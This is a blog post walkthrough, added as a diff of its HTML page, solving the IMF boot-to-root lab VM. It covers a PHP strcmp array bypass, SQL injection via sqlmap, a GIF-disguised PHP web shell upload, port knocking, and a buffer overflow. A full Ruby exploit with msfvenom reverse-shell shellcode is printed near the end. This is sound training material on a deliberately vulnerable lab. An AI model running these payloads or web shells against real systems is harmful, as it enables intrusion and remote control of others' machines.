@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta content="security, vulnhub" name="keywords">
+<meta content="Alex Flores" name="author">
+<meta property="og:title" content="B2R: IMF Walkthrough - SecBlog">
+<meta property="og:url" content="https://sec.alexflor.es/post/imf_walkthrough/">
+<meta property="og:description" content="Things have been OK for me except that I&#39;m a zombie now">
+<meta property="og:type" content="website" />
+<title>B2R: IMF Walkthrough | SecBlog</title>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+<link rel="stylesheet" href="https://sec.alexflor.es//css/style.css">
+<link rel="shortcut icon" href="https://sec.alexflor.es//wave.ico">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/github.min.css">
+
+</head>
+
+<body>
+<section class="section">
+  <div class="container">
+    <nav class="nav">
+      <div class="nav-left">
+        <a class="nav-item" href="https://sec.alexflor.es/"><h1 class="title is-4">SecBlog</h1></a>
+      </div>
+      <div class="nav-right">
+        <nav class="nav-item level is-mobile">
+          
+          <a class="level-item" href="https://github.com/audibleblink" target="_blank">
+            <span class="icon">
+              <i class="fa fa-github"></i>
+            </span>
+          </a>
+          
+          <a class="level-item" href="https://twitter.com/4lex" target="_blank">
+            <span class="icon">
+              <i class="fa fa-twitter"></i>
+            </span>
+          </a>
+          
+          <a class="level-item" href="https://linkedin.com/in/alex2" target="_blank">
+            <span class="icon">
+              <i class="fa fa-linkedin-square"></i>
+            </span>
+          </a>
+          
+          <a class="level-item" href="/index.xml" target="_blank">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+          </a>
+          
+        </nav>
+      </div>
+    </nav>
+  </div>
+</section>
+
+<section class="section">
+  <div class="container">
+    <h1 class="title">B2R: IMF Walkthrough</h1>
+    <h2 class="subtitle is-5">November 1, 2016 by Alex Flores</h2>
+    
+      <div class="tags">
+    
+        <a class="button is-link" href="/tags/pentesting">pentesting</a>
+    
+        <a class="button is-link" href="/tags/boot2root">boot2root</a>
+    
+</div>
+
+    
+    <div class="content">
+      <p>After mapping the network and finding our IP address at <code>192.168.1.162</code>, we can add it to our <code>/etc/hosts</code>
+temporarily to make things a little easier for us.</p>
+
+<pre><code class="language-bash.prettyprint">echo &quot;192.168.1.162     imf&quot; &gt;&gt; /etc/hosts
+</code></pre>
+
+<p>Lets see what kind of machine we&rsquo;re dealing with.</p>
+
+<p><img src="https://i.imgur.com/1DmhXnq.png" alt="" /></p>
+
+<p>Ok, so web only. Great. <code>nikto</code> didn&rsquo;t reveal any low-hanging fruit so let&rsquo;s dive into the source.</p>
+
+<p><img src="https://i.imgur.com/S4hPuB2.png" alt="" /></p>
+
+<p>Check that out! Our first flag was hidden in <code>http://imf/contact.php</code>. This looks like base64. After decoding
+we get the clue <code>allthefiles</code>. Lets keep looking.</p>
+
+<p>Going back to the source code, I found a javascript file that also looked like it was base64 but it didn&rsquo;t
+return any results. After a while of going in circles I took my dog for a walk and pondered about what
+&lsquo;allthefiles&rsquo; could mean. When I came back and looked over the source code again, I saw this:</p>
+
+<p><img src="https://i.imgur.com/ANZ1UgC.png" alt="" /></p>
+
+<p>All the files, ey?</p>
+
+<p><img src="https://i.imgur.com/Ik1rUga.png" alt="" /></p>
+
+<p>If we visit that directory on our webapp</p>
+
+<p><img src="https://i.imgur.com/75xqVVJ.png" alt="" /></p>
+
+<p>Ok, no DB here. We&rsquo;re dealing with a hardcoded password which means we&rsquo;re dealing with an equaltiy operator
+on the backend or possibly the <code>strcmp()</code> function. I messed around with nullbyte string termination exploits
+here for a while but ultimately ended up nowhere. Let&rsquo;s assume we&rsquo;re dealing with <code>strcmp</code> since it&rsquo;s easier
+to fool a function than to fool an operator.</p>
+
+<p><img src="https://i.imgur.com/qo8t92C.png" alt="" /></p>
+
+<p>I&rsquo;m not very good with PHP, but I&rsquo;m guessing that I need this function to return a <code>0</code> so I fired up
+<a href="https://repl.it">repl.it</a> and started trying to break it. Turns out if you feed it the wrong type (it
+expects two strings), it seems to return a <code>0</code>.</p>
+
+<p><img src="https://i.imgur.com/iQiFPrC.png" alt="" /></p>
+
+<p>So if we can feed this function an array from the web form, we might be able to bypass the password check. By
+changing the name of the form&rsquo;s password field from <code>pass</code> to <code>pass[]</code>, we can do just that.</p>
+
+<p><img src="https://i.imgur.com/DpxX4o7.png" alt="" /></p>
+
+<p>With the modified form, a BS password, and a username from the Contacts page, we get&hellip;</p>
+
+<p><img src="https://i.imgur.com/wB0UUP3.png" alt="" /></p>
+
+<p>The decoded flag just has us click through to the CMS</p>
+
+<pre><code class="language-bash.prettyprint">root@kali:~                                                                                                                                                                                     ⍉
+❯❯ echo Y29udGludWVUT2Ntcw== | base64 -d
+continueTOcms
+</code></pre>
+
+<p>The CMS has 3 pages to choose from and none of them seemed to have any relevant info. I tried (too long) to
+use LFI exploits here, modifying URLs, headers, HTTP methods&hellip; nothing. I was trying to enter an empty
+<code>pagename</code> for like the 100th time when I fat fingered the &ldquo;enter&rdquo; key and hit <code>' + Enter</code> at the same time
+when I saw this:</p>
+
+<p><img src="https://i.imgur.com/Oqo4ZQg.png" alt="" /></p>
+
+<p>SQL! Alright, fired up <code>sqlmap</code></p>
+
+<p><img src="https://i.imgur.com/izezAtP.png" alt="" />
+<img src="https://i.imgur.com/uckNUTe.png" alt="" /></p>
+
+<p>Looks like we have an image at <code>imfadministrator/images/whiteboard.jpg</code></p>
+
+<p><img src="https://i.imgur.com/BBLfAQY.png" alt="" /></p>
+
+<p>The QR Code is our next flag <code>flag4{dXBsb2FkcjkOMi5waHA=}</code></p>
+
+<pre><code class="language-bash.prettyprint">root@kali:~                                                                                                                                                                                     ⍉
+❯❯ echo dXBsb2Fkcjk0Mi5waHA= | base64 -d
+uploadr942.php   
+</code></pre>
+
+<p>We navigate to <code>http://imf/imfadministrator/uploadr942.php</code> and we get our uploader. After messing around
+with it a bit we can see that the response html from a successful upload has a hash of some sort. I&rsquo;m
+guessing its the hashed version of the filename in the <code>/uploads</code> folder.</p>
+
+<p>Maybe we can craft a malicious image with a reverse_tcp meterpreter payload then insert the new page into our
+db so it gets executed.</p>
+
+<p><img src="https://i.imgur.com/y8obNV4.png" alt="" /></p>
+
+<p>Let&rsquo;s upload it!</p>
+
+<p><img src="https://i.imgur.com/ePzjKU9.png" alt="" /></p>
+
+<p>Haha! Whoops. Alright what about just regular command execution:</p>
+
+<pre><code class="language-bash.prettyprint">cat &lt;&lt;EOF &gt; muahaha.gif
+GIF89a
+&lt;?php \`id\` ?&gt;
+</code></pre>
+
+<p>Since CrappyWAF detects functions calls, we should modify our script to take the command from a query
+parameter. Let&rsquo;s replace <code>id</code> with <code>$cmd=$_GET['cmd']; echo $cmd</code> and try again.</p>
+
+<p><img src="https://i.imgur.com/v0uaGPw.png" alt="" /></p>
+
+<p>Lets get a shell that&rsquo;s easier to work with with <code>msfvenom</code>.</p>
+
+<p><img src="https://i.imgur.com/lXrjIik.png" alt="" />
+<img src="https://i.imgur.com/dRelPbw.png" alt="" /></p>
+
+<p>It&rsquo;s time to get a sense of the machine we&rsquo;re in. &ldquo;Presence&rdquo;</p>
+
+<ul>
+<li>interesting processes - knockd, sshd</li>
+<li>interesting files (world readable, executable root files, etc) - <code>/usr/local/bin</code>
+
+<ul>
+<li><code>cat /usr/local/bin/access_codes #&gt; SYN 7482,8279,9467</code></li>
+<li><code>/usr/local/bin/agent</code> - connect to some sort of agent portal; download it</li>
+</ul></li>
+<li>listening ports <code>netstat -plnt</code> - 7788</li>
+</ul>
+
+<p>It looks like we&rsquo;ve got a hidden service running on 7788. To enable it, we have to &lsquo;knock&rsquo; in the right order
+so the firewalll opens up. If we send SYN packets to 7482 8279 9467, it might open up.</p>
+
+<p><img src="https://i.imgur.com/SgDQYRk.png" alt="" />
+<img src="https://i.imgur.com/SdM3380.png" alt="" /></p>
+
+<p>Lets decompile our downloaded binary at <a href="https://retdec.com/decompilation-run/">https://retdec.com/decompilation-run/</a></p>
+
+<p><img src="https://i.imgur.com/WnuLN8R.png" alt="" /></p>
+
+<p>We can see on line 49 where the authentication happens. It&rsquo;s comparing against a string that was defined on
+line 37, <code>0x2ddd984</code>. If we pop this into an online hex converter, we get <code>48093572</code></p>
+
+<p><img src="https://i.imgur.com/rs6S3Yf.png" alt="" /></p>
+
+<p>After navigating through our binary, we have a place where we have user input. This is looking like it&rsquo;s
+going to be a buffer overflow exploit. Once we download our application and run it through <code>gdb</code>, we confirm
+that the report function is vulnerable.</p>
+
+<p><img src="https://i.imgur.com/4CxBLoX.png" alt="" />
+<img src="https://i.imgur.com/bD9RCyw.png" alt="" /></p>
+
+<p>Bingo. Plug 0x41366641 into <code>pattern_offset</code> we see that our buffer ends at 168, meaning our EIP register is
+at 169. If we inspect the assembly for the <code>report</code> function, we see that our report string is stored in EAX.
+Because we have control of both EIP and EAX, it makes sense that we use this control to point one to the
+other. We can place our exploit at the beginning of EAX by simply injecting it as the &ldquo;report&rdquo;. We&rsquo;ll then
+pad the input string until it&rsquo;s 168 characters long. Then, well tell EIP that it should return to the
+beginning of EAX where our payload is waiting.  If we search to see if EAX is ever called, we can use that
+address in EIP.</p>
+
+<p><img src="https://i.imgur.com/R7BFi8b.png" alt="" />
+<img src="https://i.imgur.com/3yWsjBr.png" alt="" /></p>
+
+<p>Lets generate our shellcode and start to write the exploit.</p>
+
+<pre><code class="language-bash.prettyprint">msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.1.161 LPORT=4444 -f ruby -b &quot;\x00\x0a\x0d&quot;
+</code></pre>
+
+<pre><code class="language-bash.prettyprint">require 'socket'
+
+host = '192.168.1.162'
+
+if ARGV[0] == 'knock'
+  [7482, 8279, 9467].each do |port|
+    puts &quot;knocking on #{port}&quot;
+    `nmap -Pn --host_timeout 201 --max-retries 0 -p #{port} #{host} &amp;&gt;/dev/null`
+  end
+end
+
+buf = 
+&quot;\xda\xd4\xd9\x74\x24\xf4\x58\xbb\xc8\x28\xf5\xc3\x29\xc9&quot; +
+&quot;\xb1\x12\x31\x58\x1a\x83\xc0\x04\x03\x58\x16\xe2\x3d\x19&quot; +
+&quot;\x2e\x34\x5e\x09\x93\xe8\xca\xac\xa3\x69\x83\x50\x0e\xf5&quot; +
+&quot;\x04\xc9\xf9\x36\x82\xef\x58\xde\xd0\xef\x8b\x43\x5d\x0e&quot; +
+&quot;\xc1\x1d\x05\x81\x47\xb5\x3c\xc0\x2b\xf4\xbe\xb1\xab\xbf&quot; +
+&quot;\xbe\xa5\xb3\xbf\x37\x26\x72\x54\x4b\x68\x96\xa7\xe3\x17&quot; +
+&quot;\x94\x38\x58\x61\xc7\xa0\xe8\x7d\xb8\xd0\xd9\xfe\x47\x37&quot;
+
+eip = &quot;\x63\x85\x04\x08&quot;
+
+exploit = buf + &quot;A&quot;*70 + eip
+
+s = TCPSocket.new(host, 7788)
+puts s.readpartial(512)
+s.write(&quot;48093572\n&quot;)
+
+puts s.readpartial(512)
+s.write(&quot;3\n&quot;)
+
+puts s.readpartial(512)
+s.write(exploit + &quot;\n&quot;)
+</code></pre>
+
+<p>Let&rsquo;s run it!</p>
+
+<p><img src="https://i.imgur.com/ImmvfQj.png" alt="" /></p>
+
+<p>And there we have it! Thanks for reading!</p>
+
+    </div>
+    
+        <div class="nav-left">
+    <a class="nav-item" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fsec.alexflor.es%2fpost%2fimf_walkthrough%2f" title="Share on Facebook" target="_blank"><span class="fa fa-facebook fa-2x" aria-hidden="true"></span></a>
+    <a class="nav-item" href="https://plus.google.com/share?url=https%3a%2f%2fsec.alexflor.es%2fpost%2fimf_walkthrough%2f" title="Share on Google+" target="_blank"><span class="fa fa-google-plus fa-2x" aria-hidden="true"></span></a>
+    <a class="nav-item" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fsec.alexflor.es%2fpost%2fimf_walkthrough%2f" title="Share on LinkedIn" target="_blank"><span class="fa fa-linkedin fa-2x" aria-hidden="true"></span></a>
+    <a class="nav-item" href="https://twitter.com/home?status=B2R%3a%20IMF%20Walkthrough - https%3a%2f%2fsec.alexflor.es%2fpost%2fimf_walkthrough%2f" title="Tweet this" target="_blank"><span class="fa fa-twitter fa-2x"></span></a>
+    <a class="nav-item" href="http://www.reddit.com/submit?url=https%3a%2f%2fsec.alexflor.es%2fpost%2fimf_walkthrough%2f&title=B2R%3a%20IMF%20Walkthrough" title="Share on Reddit" target="_blank"><span class="fa fa-reddit-alien fa-2x" aria-hidden="true"></span></a>
+    
+    </div>
+    
+  </div>
+</section>
+
+
+<section class="section">
+  <div class="container has-text-centered">
+    <p>Untitled.</p>
+  </div>
+</section>
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/highlight.min.js" integrity="sha256-+bhVTaRmJ/c07eV80nU8gD2cBBF0rYkf1txqXlrbvb0=" crossorigin="anonymous"></script>
+
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/languages/go.min.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js"></script>
+
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/languages/dockerfile.min.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js"></script>
+
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/languages/javascript.min.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js"></script>
+
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/languages/python.min.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js"></script>
+
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/languages/ruby.min.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js"></script>
+
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+<script>
+window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+ga('create', 'UA-12497311-8', 'auto');
+ga('send', 'pageview');
+</script>
+<script async src='//www.google-analytics.com/analytics.js'></script>
+
+
+
+</body>
